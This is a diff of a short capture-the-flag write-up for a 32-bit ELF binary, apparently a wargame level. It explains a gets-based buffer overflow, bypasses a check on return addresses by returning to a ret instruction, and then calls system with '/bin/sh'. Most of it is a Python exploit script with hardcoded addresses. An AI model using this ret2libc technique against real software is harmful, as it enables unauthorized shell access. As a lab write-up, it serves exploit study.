@@ -1,10 +1,17 @@
-import struct
-padding = "A" * 80
-return_to_ret = struct.pack("I", 0x0804853e)
+* In this level2 , we are dealing with 32 bin elf binary 
+* when examining the memory on gdb i found a call to function called "p"
+* Function p uses gets to read the input from the user , obviously this program is prone to buffer overflow attack 
+* a small protection here is that the program test after reading the user input if the return address is starting with 0xb
+* to bypass this resitriction i overwrite the return address with the return address of the p function than i return to system .
+
+- the following python script describ how i did it : 
+
+
+import struct                              
+padding = "A" * 80                                                  
+return_to_ret = struct.pack("I", 0x0804853e)                    // overwrite the return address with return to function p 
 system = struct.pack("I", 0xb7e6b060)
 return_after_system = struct.pack("I", 0xb7e5ebe0)
 bin_sh = struct.pack("I", 0xb7f8cc58)
 print padding + return_to_ret + system + return_after_system + bin_sh
 
-
-* In this level2 , we are dealing with 32 bin elf binary 
